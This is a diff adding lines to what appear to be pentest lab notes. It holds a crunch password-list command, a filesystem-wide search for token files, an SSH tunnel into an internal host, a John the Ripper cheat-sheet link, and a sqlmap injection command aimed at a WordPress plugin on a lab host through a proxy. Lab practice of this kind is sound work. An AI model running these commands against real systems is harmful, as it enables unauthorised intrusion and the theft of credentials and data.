@@ -20,3 +20,14 @@ Create password file!
 Crunch 7 7 -t ‘mos’%%%% -o test.txt 
 
 find / -name "*token*" 2>/dev/null
+
+
+ssh tunneling:
+ssh -L 8080:192.168.0.7:80 e.lindsey@192.168.101.9
+John the ripper cheat sheat
+http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
+
+SQLMAP using proxy:
+sudo sqlmap -u "http://cybear32c.lab/wp-content/plugins/wpsymposium/get_album_item.php?size=1"
+--dbs
+--proxy="http://192.168.101.8:3128" --proxy-cred="b.muncy:xxxx" 
